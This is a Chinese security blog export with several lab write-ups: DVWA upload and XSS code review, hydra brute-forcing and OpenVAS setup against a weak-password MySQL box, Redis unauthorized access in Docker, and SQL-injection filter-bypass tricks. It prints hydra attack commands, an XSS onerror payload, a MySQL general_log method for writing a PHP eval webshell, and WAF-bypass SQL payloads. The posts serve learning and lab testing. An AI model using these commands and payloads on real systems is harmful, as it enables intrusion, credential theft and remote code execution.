然后文件大小也进行了判断。所以这里主要存在两个限制条件，首先必须以特定文件名结尾，然后文件格式还得满足特定的图片格式。但是这样的代码虽然加大攻击难度，在一些条件成立的条件下，仍旧可以进行攻击，上传shell,首先图片格式可以伪造，在元数据中包含webshell，然后找到一个文件包含漏洞，就可以成功实现攻击，上c传shell。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo "&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"; &#125; else &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这个代码规范里，除了有之前所说的一些限制外，还加上了随机id与文件名结合MD5编码作为文件名，这会让webshell连接的时候找不到具体的文件而吃闭门羹。而且使用了imagecreatefromjpeg（）函数来对上次的图进行了重构，去除了多余的元数据，使得webshell无法隐匿在图片里面。这样一来双重保险下，彻底断绝了upload漏洞的可能。当然这里仍旧加入了Anti-CSRFtoken来防止CSRF攻击。 XSS反射型反射型xss是一种attack通过操作url，web应用将attack输入的url参数不加过滤或者过滤不全的情况下直接回显到客户端，造成前端脚本注入执行（多是JS执行），读者可以通过以下的实例看到漏洞的产生细节。当然在反射型xss中有一种别具一格的漏洞利用方式，那就是DOM型xss,这种类型的xss不会直接出现拼接到源码中，而是js在运行时操作dom对象来实现输出。DVWA只对xss笼统的归纳，归纳为反射型和存储型。那么我们就先对这两种编码规范进行理解（把dom 型xss放一放)。由于本身的代码量不大，所以直接给出所有反射型代码如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//Low&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; //Medium&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; ?&gt; //High&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; ?&gt; //Impossible&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 通过以上的代码范例可以看到，在medium和high的防御措施上，仍旧是黑名单式的过滤，而且思考的很狭隘，只是过滤了&lt;script&gt;标签，medium中直接硬编码的黑名单最不可取，别说换标签，直接大小写绕过；在High级别里面，通过正则，避免了&lt;script&gt;标签使用的可能，但是能够触发js的标签远不止这一个，随便一个如&lt;img src=1 onerror=[xss]&gt;都是可以绕过的。可以想到基于黑名单的策略是很容易疏漏的，不可取。在impossible中，直接对输入进行htnlspecilchars()编码转换，杜绝了xss。 存储型注意下面的代码只是偏向于服务器对用户的输入不经过验证处理就直接入库，导致下次取出展现到前端的时候出现xss。代码没有包含从数据库取出的操作部分。因为只要从用户获取到数据后进行了严格的验证处理，就可以避免存储型xss，所以最终原因不是从数据库取出部分，所以DVWA省略掉了。出于篇幅原因，在DVWA的存储型的漏洞复现中的缺陷细节和反射型类似，都是标签，正则过滤不全。就不再赘述，现把impossible代码规范列出：1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到代码中对txtName和mtxMessage用htmlspecialchars()转义成了html实体，但是仅有这个是不够的，我们从前面的函数解释可以了解到，这个函数在不加ENT_QUOTES参数是默认不转义&#39;，而且该函数不考虑\（容易造成sql注入，语句单引号被转义问题，当然数据库交互不是PDO模式才有可能存在sql注入），这样仍旧会造成xss，好在代码之前还使用了stripslashes()和mysql_real_escape_string()来分别对&#39;和\进行过，从而杜绝了xss。 参考文献https://www.sitepoint.com/top-10-php-security-vulnerabilities/http://blog.jobbole.com/53821/https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheethttp://www.dvwa.co.uk/https://github.com/Go0s/LFIboomCTF]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web安全</tag>
        <tag>代码审计</tag>
        <tag>安全编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建]]></title>
    <url>%2F2018%2F08%2F14%2Fmysql%E5%BC%B1%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被这两个工具深深安利到了，所以写下这篇文章，主要介绍工具的使用和安装过程。 hydrahydra 这个工具的安装还是比较的友好，可以直接使用的包管理器。在日常的使用中，要注意收集一些比较好用的字典，或者根据渗透测试的信息搜集，生成一些比较有针对性的字典。 hydra的强大体现在它支持的服务类型相当的多，集成化很高，并且使用接口很简单，目前支持的服务类型有123456789Asterisk,AFP,CiscoAAA,Ciscoauth,Ciscoenable,CVS,Firebird,FTP,HTTP-FORM-GET,HTTP-FORM-POST,HTTP-GET,HTTP-HEAD,HTTP-POST,HTTP-PROXY,HTTPS-FORM-GET,HTTPS-FORM-POST,HTTPS-GET,HTTPS-POST,HTTPS-HEAD,HTTP-Proxy,ICQ,IMAP,IRC,LDAP,MS-SQL,MYSQL,NCP,NNTP,OracleListener,OracleSID,Oracle,PC-Anywhere,PCNFS,POP3,POSTGRES,RDP,Rexec,Rlogin,Rsh,RTSP,S7-300,SAP/R3,SIP,SMB,SMTP,SMTPEnum,SNMP,SOCKS5,SSH(v1andv2),Subversion,Teamspeak(TS2),Telnet,VMware-Auth,VNCandXMPP. 参数介绍1234567891011121314151617181920212223242526272829303132333435363738394041hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns][-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]-R 继续从上一次进度接着破解。-S 采用SSL链接。-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。server 目标ip# hydra的使用十分简单，用得比较多的是-P，-p,-l,-L选项，常见的暴力破解命令举例：#破解ssh：hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.8 ssh#破解smb hydra -l administrator -P pass.txt 10.36.16.18 smb #破解mysqlhydra -l root –p pass.txt –e ns 127.0.0.1 mysql#破解post web登陆hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;# 关于hydra的代理使用,现在已经支持socks5,socks4,http,同时可以支持代理列表的方式，现在已经可以支持64个实体代理列表export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)export HYDRA_PROXY=connect_and_socks_proxylist.txt (up to 64 entries)export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080export HYDRA_PROXY_HTTP=proxylist.txt (up to 64 entries) OpenVASOpenVAS是开放式漏洞评估系统，Nessus项目分支，可以用来管理目标系统的漏洞，并且免费开源，在kali默认安装，但未配置和启动。它里面集成了现在比较大型的漏洞发布平台的数据库，并且可以实现自动化poc利用和漏洞探测，包括CVE，NVD等。 这个工具的安装还是相当的繁琐的，涉及证书的导入，redis,sqlite3数据库的安装,还有漏洞数据库的更新，整个流程做下来还是相当的费时间的。在虚拟机的fedora里面体验了一把原生态的安装流程，真的是要吐血了，好在现在有docker这个神器，一切都是那么的优雅。所以现在记录一下fedora,kali,docker的安装流程。其实docker里的安装其实是基于ubuntu 16.04的镜像进行构建的，查看Dockerfile可以学习到ubuntu 16.04下的安装办法。 Kali 2.01234567891011121314151617181920212223# 安装apt-get -y install openvas# 启动流程，涉及证书导入，数据库启动，openvas进程启动等，有些费时openvas setup# 检擦安装版本8或者版本9的开启情况，现在的最新版本是版本9，这个脚本比较方便我们去判断到底openvas是否启动完成，如果有报错，我们可以根据日志文件和fix建议进行相关操作。openvas-check-setup [-v8]|[-v9] /*使用openvas-stop或openvas-start命令，将同时停止或启动OpenVAS服务中的三个程序，即Greenbone Security Assistant、OpenVAS Scanner和OpenVAS Manager。如果用户想要启动或停止单个服务时，可以使用service命令实现。9390为openvas 管理端端口9391 scanner扫描端口9392 web界面登录端口*/# 获取/创建用户，并修改用户密码openvasmd --get-userssudo openvasmd --create-user=admin --role=Adminopenvasmd --user=admin --new-password=123# openvas 版本升级openvas-feed-update fedora安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#关闭selinuxvim /etc/selinux/config #将SELINUX=enforcing改为SELINUX=disabled,重启机器即可# 更新sudo dnf update#安装openvassudo dnf install openvas*#安装redissudo dnf install redis* -y#安装sqlite3sudo dnf install sqlite3* -y#安装证书生成工具sudo dnf guntls-utils#编辑redis配置文件，删除以下前导符‘#’# unixsocket /tmp/redis.sock# unixsocketperm 700#后台启动redissudo redis-server /etc/redis.conf&amp;#检擦启动情况openvas-check-setup [-v8]|[-v9] #同步nvt库sudo greenbone-nvt-sync#建立同步本地scapdata数据库sudo greenbone-scapdate-sync#获取证书sudo greenbone-certdata-sync#递归创建需要的目录sudo mkdir -p /var/lib/openvas/openvasmd/gnupg#启动scannersudo openvassd#重建数据库,耗时较久sudo openvasmd --rebuild#创建用户和修改密码sudo openvasmd --create-user=admin --role=Adminopenvasmd --user=admin --new-password=password#生成证书sudo openvas-manage-cert -a#启动gsad(greenbone security assistant),设置端口信息sudo gsad --listen=127.0.0.1 --port=9392 #启动openvasdsudo openvasd 启动1234sudo redis-server /etc/redis.conf &amp;sudo openvassdsudo openvasmdsudo gsad --listen=127.0.0.1 --port=9392 docker1234567# 搜索镜像docker search openvas#选择排名最高的docker pull mikesplain/openvas:9#限制cpu和内存，以deamon方式启动镜像docker run --cpuset-cpus=2 -m 2048M -d -p 443:443 --name openvas mikesplain/openvas:9#浏览器访问：https://localhost,登陆用户名/密码为：admin/admin，enjoy! mysql弱密码环境配置搭建好lamp后开始进行修改配置 mysql设置远程访问12345678# 修改配置文件和设置远程访问运行，以root用户为例GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;# 把所有权限赋予root用户,并让root用户拥有分配这些权限的权利，同时设置登陆密码为123456，同时接受任何远程主机的连接FLUSH PRIVILEGES #刷新权限表体外话：# 假设要给lypto用户在192.168.1.100的内网机器访问的权限，则//GRANT ALL PRIVILEGES ON *.* TO &apos;lypto&apos;@’192.168.1.100’ IDENTIFIED BY &apos;654321&apos; WITH GRANT OPTION; iptables 端口放行12iptables -A INPUT -p tcp --dport 3306 -j ACCEPTiptables -A OUTPUT -P tcp --sport 3306 -j ACCEPT 漏洞验证hydra爆破为了减少爆破难度和速度，mysql远程登陆的密码设置为123456，并且自制字典仅包含两项wearefamily,123456,尝试爆破 OpenVAS扫描 使用openvas进行扫描，设置参数的时候为了减少扫描时间，可以设置只扫描3306端口，尽管这样，因为是虚拟机里面运行，所以比较慢，最后结果比较理想，不仅仅返回了mysql弱密码的9.0以上的高危漏洞评级，而且在漏洞细节里面还爆破出了密码：123456 漏洞利用登陆mysql后参数查看与信息搜集1234567891011121314151617select version();select @@version;select current_user();select user();select database();select @@version_compile_os;select @@basedir;# 默认值 5.7.20-0ubuntu0.16.04.1 /usr/ select @@datadir;# 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql/select @@plugin_dir; # 默认值 5.7.20-0ubuntu0.16.04.1 /usr/lib/mysql/plugin/select @@secure_file_priv# 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql-files/SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;SELECT @@global.secure_file_priv;show variables like &apos;%general%&apos;; mysql文件操作传shellsecure_file_priv mysql的一个全局只读变量,即使是root用户也没有办法对其进行运行时修改。用于限制数据的导入导出，例如load_file 和select … into outfile 等。mysql 5.5.53 和以前的版本，默认值为空。允许导入导出。之后的版本默认为‘NULL’ ,禁用了导入导出功能。为了安全，不要设置为空。可以设置为NULL 或者 一个限制好权限的目录。 靶机开放读写的权限，设置secure_file_prive=/var/www/html但是现在mysql以及相对安全了许多，默认的值是，并且不允许在运行时修改，这样在利用的时候就显得有些鸡肋。123456# 限制mysqld的导入和导出，完全禁止出。mysqld --secure_file_prive=null# 限制mysqld的导入和导出，只能在特定目录 /tmp/之下mysqld --secure_file_priv=/tmp/# 不限制mysqld的导入和导出在文件/etc/my.cnf中不写 --secure_file_priv 使用mysql日志功能写shell在网上看到可以开启日志记录功能，直接修改log的写入文件，就可以传入webshell,网上的教程如下：123set global general_log = on; # 开启general log模式set global general_log_file = &apos;/var/www/html/1.php&apos;; # 设置日志目录为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; # 写入shell 但是在具体的实现过程中，发现这个利用也有相当多的限制条件，首先/var/www/html/下必须要有写的权限，其次写入的shell还要能够以apache2运行用户如www-data执行得起来。实操中发现，手动修改了/var/www/html 权限为777的条件下，在linux的环境下菜刀仍旧是连不上。当修改mysql log写入文件如shell.php的权限为777的时候，才可以连得上。但是令人最为费解的地方在于，以root用户身份重新修改了文件权限为原来的620，发现菜刀仍旧可以连得上，难不成这一次修改来回发生了什么不为人知的奥秘？笔者一时解释不清，暂时放在这。慢慢探讨究竟。 参考http://www.freebuf.com/column/152404.htmlhttps://www.cnblogs.com/zhaijiahui/p/8371336.htmlhttps://www.jianshu.com/p/a4f01fc3a720https://blog.csdn.net/qq_15983061/article/details/77892851http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>mysql弱密码</tag>
        <tag>hydra</tag>
        <tag>OpenVAS</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权访问]]></title>
    <url>%2F2018%2F08%2F12%2Fredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[漏洞虽然是比较老，但是本着积累经验的思想，同时学习在docker环境下实现漏洞环境复现，折腾了些点时间，现把相关总结记录如下。dockerfile 已经上传在了github：https://github.com/IversionBY/vulntarget 漏洞知识背景Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。通俗的来说就是redis默认配置文件端口访问是不需要认证的。这样一来，根据redis服务运行权限，我们可以以其为门窗实现渗透利用，包括但不仅限于传webshell，root权限下的authorized_keys公钥注入，实现ssh免密登陆，回弹shell等一系列操纵。 redis基础数据类型：string(字符串),hash(散列),list(列表),set(集合),zset(有序集合)。每种数据类型都内置了很多方便操作的函数来实现对数据的处理。更多的可以参考:http://www.runoob.com/redis/redis-tutorial.html string 是 redis 最基本的类型，一个 key 对应一个 value。string也可以为二进制，图片等等类型。string 类型的值最大能存储 512MB 1234127.0.0.1:6379&gt; SET name &quot;1ypto&quot;OK127.0.0.1:6379&gt; GET name&quot;1ypto&quot; 哈希是一个key值里面有field和value的映射表，可以看成是有名字的字典。比较适合存储对象。 123456127.0.0.1:6379&gt; HMSET myhash field1 &quot;Hello&quot; field2 &quot;World&quot;&quot;OK&quot;127.0.0.1:6379&gt; HGET myhash field1&quot;Hello&quot;127.0.0.1:6379&gt; HGET myhash field2&quot;World&quot; Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。列表和python有点类似，但是插入方式更为灵活，可以前（左），可以后（右）。列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿)。 12345678910111213127.0.0.1:6379&gt; LPUSH 1ypto redis(integer) 1127.0.0.1:6379&gt; LPUSH 1ypto hello(integer) 2127.0.0.1:6379&gt; LPUSH 1ypto hello(integer) 3127.0.0.1:6379&gt; RPUSH 1ypto world(integer) 4127.0.0.1:6379&gt; LRANGE 1ypto 0 31) &quot;hello&quot;2) &quot;hello&quot;3) &quot;redis&quot;4) &quot;world&quot; Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。不允许重复是和列表最大的差别。集合中最大的成员数为 232 - 1(4294967295, 每个集合可存储40多亿个成员)。 123456789101112127.0.0.1:6379&gt; sadd redis redis(integer) 1127.0.0.1:6379&gt; sadd redis hello(integer) 1127.0.0.1:6379&gt; sadd redis hello(integer) 0127.0.0.1:6379&gt; sadd redis world(integer) 1127.0.0.1:6379&gt; smember redis1) &quot;hello&quot;2) &quot;world&quot;3) &quot;redis&quot; Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。123456789101112127.0.0.1:6379&gt; zadd hacker 1 redis(integer) 1127.0.0.1:6379&gt; zadd hacker 5 hello(integer) 1127.0.0.1:6379&gt; zadd hacker 4 hello(integer) 0127.0.0.1:6379&gt; zadd hacker 3 world(integer) 1127.0.0.1:6379&gt; ZRANGEBYSCORE hacker 0 51) &quot;redis&quot;2) &quot;world&quot;3) &quot;hello&quot; 安装1234567hellogirl@Lypto:~$ wget wget http://download.redis.io/releases/redis-4.0.11.tar.gzhellogirl@Lypto:~$ tar zxf redis-4.0.11.tar.gzhellogirl@Lypto:~$ cd redis-4.0.11/hellogirl@Lypto:~/redis-4.0.11$ ls00-RELEASENOTES CONTRIBUTING deps Makefile README.md runtest runtest-sentinel src utilsBUGS COPYING INSTALL MANIFESTO redis.conf runtest-cluster sentinel.conf testshellogirl@Lypto:~/redis-4.0.11$ make 注意到安装完后redis-server,redis-cli在src文件夹里面，redis.conf配置文件在根目录下 常用命令123456789101112131415161718192021222324252627//登陆redis-cli -h host -p port -a password（if has） --raw(避免中文乱码)//系统QUIT //关闭连接HELP [CMD] //查看cmd帮助CLUSTER SLOTS //获取集群节点的映射数组COMMAND //获取 Redis 命令详情数组DBSIZE //返回当前数据库的 key 的数量KEYS * //列出所有key值KEYS [patten]//正则搜索键值INFO //获取redis服务器的各种信息//删除FLUSHDB // 清除当前数据库的所有keysFLUSHALL // 清除所有数据库的所有keys//攻击常用的向量CONFIG GET dir //获取默认的redis目录CONFIG SET dir [xxx] //修改redis目录CONFIG GET dbfilename //获取rdb文件名CONFIG GET dbfilename [xxx] //修改rdb文件名...... 更多命令可查阅官方文档：https://redis.io/commands 漏洞的利用方式我们可以根据漏洞的原理，从远程免认证登陆redis,然后利用内置命令如CONFIG等来做文章（上文提到的攻击向量）。常见的有这种利用方式，读取key值数据，进行信息搜集和泄露，删库改库以及回弹shell,写入webshell,ssh免密密登陆等一系列操作。前人的文章比较多，总结得也十分到位，这里给出一些链接。AlloyTeam：Redis 未授权访问漏洞利用总结p0’s blog：redis 未授权访问漏洞利用总结不请自来 | Redis 未授权访问漏洞深度利用 漏洞复现对于漏洞复现的部分，笔者使用的是docker容器进行部署。之前对docker的使用不算熟练，这次也算是加深了自己对docker的操作。这个漏洞复现是使用redis未授权访问进行ssh免密登陆。构建的容器中已经安装部署了redis-server和openssh-server,也写了自动化运行服务脚本，需要做的就是漏洞验证部分，具体可以参照上面的利用方式相关文章。 Dockerfile1234567891011121314151617FROM ubuntuMAINTAINER mini.lypto@gmail.comWORKDIR /rootRUN apt-get update\ &amp;&amp;apt-get install -y openssh-server\ &amp;&amp;apt-get -y install gcc\ &amp;&amp;apt-get -y install make\ &amp;&amp;wget http://download.redis.io/releases/redis-3.2.0.tar.gz\ &amp;&amp;tar -xzf redis-3.2.0.tar.gz\ &amp;&amp;cd redis-3.2.0\ &amp;&amp;makeCOPY ./redis.conf /root/redis-3.2.0COPY ./script.sh /root CMD ./root/script.sh 为了构建镜像，需要运用到虚拟机和主机的文件copy。先把修改好的redis.conf从镜像里面copy到主机，然后才可以在Dockerfile中使用COPY。 12345678//先拿到容器的短ID或者指定的namedocker ps -all//通过容器[短id]拿到ID全称docker inspect -f &apos;&#123;&#123;.Id&#125;&#125;&apos; [短id]//拿到全ID就可以进行相互copy了docker cp 本地文件路径 ID全称:容器路径docker cp ID全称:容器文件路径 本地路径 在从dockerfile构建镜像，部署容器的时候，记得做好端口映射，否则无法从外部访问redis以及ssh服务。1234567//通过Dockerfile构建镜像docker build -t ./ redisvuln:1.0//运行镜像并进行端口绑定，确保主机端口22,6379不被占用，或者修改为其他端口docker run -ti -p 22:22 -p 6379:6379 redisvuln//或者使用后台运行方式,然后使用docker logs查看输出docker run -d redisvuln]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>linux</tag>
        <tag>redis</tag>
        <tag>未授权访问</tag>
        <tag>漏洞</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_SQL]]></title>
    <url>%2F2018%2F08%2F08%2FBypass-SQL%2F</url>
    <content type="text"><![CDATA[之前对sql注入的原理方面的梳理比较多，现在打算对sql的Bypass技巧进行一个小小的总结，这里的技术是笔者进行了大量资料的阅读以及亲自实践，总结的是很不全面，有兴趣的可以继续对参考链接进行更深的学习。 SQL Bypass 大小写绕过1sElECt * FrOM TEST; 特殊执行 12#特殊代码执行/*!select*/ * /*!from*/ /*!test*/ 注释绕过 1234567#普通注释select/**/*/**/from/**/test;select/*b*/*/*c*/from/*d*/test;select/*b`123*/*/*c`123*/from/*d`123*/test;#内联注释,版本执行/*！50000select*/ * /*!50000from*/ test 利用DBMS的内置函数(加解密，编码与反编码函数,进制转换，转义\)编码：hex()bin()ascii()char()/chr()ord()unhex()加解密函数：mysql内置的加解密函数 123456789# 利用char支持最大4个字符的特性，进行字符串拼接,字符串的数字值可由select hex("pass"),select hex("word")求出SELECT concat(char(1885434739),char(2003792484)) ;--select passwordSELECT concat(char(x'70617373'),char(b'1110111011011110111001001100100')) #"password"# 使用‘\’进行关键字转义SELECT 'he\l\lo'='hello' --SELECT 1;#调用extractvalue()SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)); --select admin; 运算符绕过针对不同的DBMS，其操作符不一样，在某些字符串被filter掉的时候，我们可以尝试使用operatorshttps://www.postgresql.org/docs/6.5/static/operators1716.htmhttps://dev.mysql.com/doc/refman/8.0/en/comparison-operators.htmlhttps://docs.oracle.com/html/A95915_01/sqopr.htm HPP/HPF/HPC(详情参看之前写的文章——sql注入捣鼓 中介角色可以使用php这样的脚本语言来进行fuzz 12345678910$link = mysql_connect('server', 'username', 'password');mysql_select_db('database', $link);for($i = 0; $i&lt;= 255;$i++) &#123;$chr = chr($i);for($j = 0; $j&lt;=255;$j++) &#123;$chr2 = chr($j);if(mysql_query('SELECT'.$chr.'1'.$chr2.'', $link)) &#123;echo dechex($i).','.dechex($j).'&lt;br&gt;';&#125; &#125; &#125; 结果：更多的细节可以参考 https://websec.ca/kb/sql_injection#MySQL_Fuzzing_Obfuscation 编码绕过 12345678#URL Encoding SELECT %74able_%6eame FROM information_schema.tables;#Double URL Encoding SELECT %2574able_%256eame FROM information_schema.tables;#Unicode Encoding SELECT %u0074able_%u6eame FROM information_schema.tables;#Invalid Hex Encoding (ASP) SELECT %tab%le_%na%me FROM information_schema.tables; mysql的弱类型 123SELECT 0='hello'; # trueSELECT 1='hello'; # falseSELECT 1='1hello'; #true 避开使用关键字的正则绕过技巧 12345678910#SpacesSELECT schema_name FROM information_schema . schemata; #BackticksSELECT schema_name FROM `information_schema`.`schemata`; #Alternative Names(别名)，注意到以下几个表格的内容并不是完全一致，而是存在有细微的差别，主要体现在键值的影响上。information_schema.table=information_schema.partitions= information_schema.statistics= information_schema.key_column_usage= information_schema.table_constraints 字符的连接方式 1234SELECT 'a' 'd' 'mi' 'n';SELECT CONCAT('a', 'd', 'm', 'i', 'n');SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n'); 摘录一下网上的一些前辈总结得比较好的bypass语句 12345678910111213141516171819202122232425***note***:"====&gt;"左边表示会被Filtered的语句，"=&gt;"右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字#filter and orand =&gt; &amp;&amp; or =&gt; ||#filter unionunion select user, password from users ====&gt; 1||(select user from users where user_id = 1) = 'admin #filter where1 || (select user from users where user_id = 1) = 'admin' ====&gt; 1||(select user from users limit 1) = 'admin # filter limit1 || (select user from users limit 1) = 'admin' ====&gt; 1||(select user from users group by user_id having user_id = 1) = 'admin'# filter group by1 || (select user from users group by user_id having user_id = 1) = 'admin' ====&gt; 1||(select substr(group_concat(user_id),1,1) user from users )=1# filter select 1 || (select substr(group_concat(user_id),1,1) user from users) = 1 ====&gt; 1||1 = 1 into outfile 'result.txt' 或者 1 || substr(user,1,1) = 'a' 1 || (select substr(group_concat(user_id),1,1) user from users) = 1 ====&gt; 1||user_id is not null 或者 1||substr(user,1,1) = 0x61 或者 1||substr(user,1,1) = unhex(61) # filter hex1||substr(user,1,1) = unhex(61) ====&gt; 1||substr(user,1,1) = lower(conv(11,10,36))# filter substr1||substr(user,1,1) = lower(conv(11,10,36)) ====&gt; 